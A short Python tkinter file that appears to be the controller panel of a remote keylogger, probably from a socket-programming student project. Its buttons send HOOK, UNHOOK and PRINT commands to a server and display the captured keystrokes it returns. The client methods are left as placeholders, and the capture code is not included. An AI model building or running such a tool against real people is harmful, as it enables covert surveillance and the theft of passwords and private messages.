import socket
import json
from PIL import Image, ImageTk
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import pynput.keyboard

class Keylog(tk.Tk):
    def __init__(self, client):
        super().__init__()
        self.client = client
        self.init_ui()

    def init_ui(self):
        self.button1 = ttk.Button(self, text='HOOK', command=self.hook_button_clicked)
        self.button1.pack()

        self.button2 = ttk.Button(self, text='UNHOOK', command=self.unhook_button_clicked)
        self.button2.pack()

        self.button3 = ttk.Button(self, text='PRINT', command=self.print_button_clicked)
        self.button3.pack()

        self.txtKQ = tk.Text(self)
        self.txtKQ.pack()

        self.butXoa = ttk.Button(self, text='Clear', command=self.clear_button_clicked)
        self.butXoa.pack()

        self.title('Keylog')

    def hook_button_clicked(self):
        command = "HOOK\n"
        # You need to send this data to the server here
        self.client.send_command(command)

    def unhook_button_clicked(self):
        command = "UNHOOK\n"
        # You need to send this data to the server here
        self.client.send_command(command)

    def print_button_clicked(self):
        command = "PRINT\n"
        self.client.send_command(command)
        data = self.client.receive_data()  # Replace with actual receive logic
        text = ''.join(data)
        self.txtKQ.insert(tk.END, text)

    def clear_button_clicked(self):
        self.txtKQ.delete('1.0', tk.END)

    def run(self):
        self.mainloop()
